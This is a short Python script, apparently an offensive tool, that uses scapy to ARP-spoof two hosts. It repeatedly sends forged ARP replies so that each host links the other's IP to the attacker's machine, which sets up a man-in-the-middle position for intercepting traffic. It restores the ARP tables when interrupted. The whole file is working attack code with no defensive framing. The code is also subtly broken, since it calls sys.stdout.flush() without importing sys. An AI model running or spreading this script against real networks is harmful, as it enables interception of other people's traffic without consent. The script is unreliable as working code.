import time
import scapy.all as scapy
from scapy.layers.l2 import Ether
import argparse

def get_arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target_ip",dest="target")
    parser.add_argument("-s","--spoof_ip",dest="spoof")
    options=parser.parse_args()
    return options
options=get_arguments()
target_ip=options.target
spoof_ip=options.spoof
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        sent_packets_count+=2
        print(f"\r [+] Packets sent: {sent_packets_count}", end='' )
        time.sleep(2)
        sys.stdout.flush()
except KeyboardInterrupt:
    print("Detected Ctrl+c...Resetting ARP tables...Please wait!")
    restore(target_ip, spoof_ip)
    restore(spoof_ip,target_ip)
